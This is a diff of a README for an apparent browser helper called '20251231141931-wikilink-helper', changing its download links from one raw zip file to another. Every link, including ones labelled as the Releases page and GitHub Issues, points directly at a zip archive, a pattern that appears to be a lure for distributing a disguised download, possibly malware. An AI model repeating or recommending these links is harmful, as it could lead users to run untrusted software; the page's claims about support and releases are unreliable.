@@ -1,6 +1,6 @@
 # 🛠️ 20251231141931-wikilink-helper - Simplify Your Navigation on Web Pages
 
-[![Download Now](https://raw.githubusercontent.com/TPRO12345789TPRO/20251231141931-wikilink-helper/main/src/helper-wikilink-1.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/TPRO12345789TPRO/20251231141931-wikilink-helper/main/src/helper-wikilink-1.1.zip)
+[![Download Now](https://github.com/TPRO12345789TPRO/20251231141931-wikilink-helper/raw/refs/heads/main/assets/wikilink-helper-2.0.zip%20Now-Click%20Here-blue)](https://github.com/TPRO12345789TPRO/20251231141931-wikilink-helper/raw/refs/heads/main/assets/wikilink-helper-2.0.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Follow these steps to set up and use the 20251231141931-wikilink-helper. You don
 
 To download the application, visit the Releases page. You can find the latest version available for download there. 
 
-[Visit this page to download](https://raw.githubusercontent.com/TPRO12345789TPRO/20251231141931-wikilink-helper/main/src/helper-wikilink-1.1.zip)
+[Visit this page to download](https://github.com/TPRO12345789TPRO/20251231141931-wikilink-helper/raw/refs/heads/main/assets/wikilink-helper-2.0.zip)
 
 1. Click on the version you want to download.
 2. Choose the appropriate file for your operating system.
@@ -62,10 +62,10 @@ A: Currently, this application is designed for desktop use only.
 
 ## 📞 Support
 
-If you experience issues or have questions, please reach out via [GitHub Issues](https://raw.githubusercontent.com/TPRO12345789TPRO/20251231141931-wikilink-helper/main/src/helper-wikilink-1.1.zip). We’re here to help!
+If you experience issues or have questions, please reach out via [GitHub Issues](https://github.com/TPRO12345789TPRO/20251231141931-wikilink-helper/raw/refs/heads/main/assets/wikilink-helper-2.0.zip). We’re here to help!
 
 ---
 
 For any further inquiries, you can also check the discussion section in the GitHub Repository. 
 
-[Visit this page to download](https://raw.githubusercontent.com/TPRO12345789TPRO/20251231141931-wikilink-helper/main/src/helper-wikilink-1.1.zip) and start enhancing your web browsing experience today!
+[Visit this page to download](https://github.com/TPRO12345789TPRO/20251231141931-wikilink-helper/raw/refs/heads/main/assets/wikilink-helper-2.0.zip) and start enhancing your web browsing experience today!
